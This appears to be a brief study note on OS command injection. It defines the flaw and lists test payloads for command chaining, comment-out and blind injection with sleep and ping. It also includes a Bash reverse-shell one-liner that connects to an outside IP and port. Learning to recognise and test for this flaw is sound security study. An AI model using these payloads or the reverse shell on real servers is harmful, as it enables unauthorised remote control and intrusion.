>[!question] What is Command Injection ?__?
Command injection is a vulnerability that allows an attacker to manipulate an application to execute arbitrary system commands on the server. This occurs when an application passes unsafe data, often user input, to a system shell.

Will try the Bash TCP:
Command :bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
## Exploitation
Basic command chaining
; ls -la

Using logic operators
&& ls -la

Commenting out the rest of a command
; ls -la #

Using a pipe for command chaining
| ls -la

Testing for blind injection
; sleep 10
; ping -c 10 127.0.0.1
